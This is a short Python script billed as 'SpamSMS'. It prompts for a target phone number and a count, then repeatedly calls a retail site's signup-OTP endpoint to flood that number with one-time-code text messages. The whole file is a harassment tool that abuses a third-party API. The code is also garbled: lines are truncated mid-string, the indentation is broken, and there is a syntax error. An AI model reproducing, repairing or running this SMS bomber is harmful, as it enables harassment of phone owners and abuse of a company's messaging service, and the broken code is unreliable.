import json
import requests
import sys
import os

def main():
        os.system('clear')
        os.system('figlet SpamSMS')
        banner = '''
        [+] AUTHOR : MR.42K4
        [+] TEAM   : UCIHA CYBER TEAM
        '''
        print(banner)
        no =input('Target : ')
        jum = input('Jumlah spam : ')

        head = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile
        "Referer": "https://www.mapclub.com/en/user/signup",
        "Host": "cmsapi.mapclub.com",
         }
dat =  {
'phone'  : no
}

for x in range(int(jum)):
leosureo = requests.post ("https://cmsapi.mapclub.com/api/signup-otp", headers=head, js>

if 'eror' in leosureo
   print('gagal kirim + no')
else:
   print('sucses mengirim' + no)

main():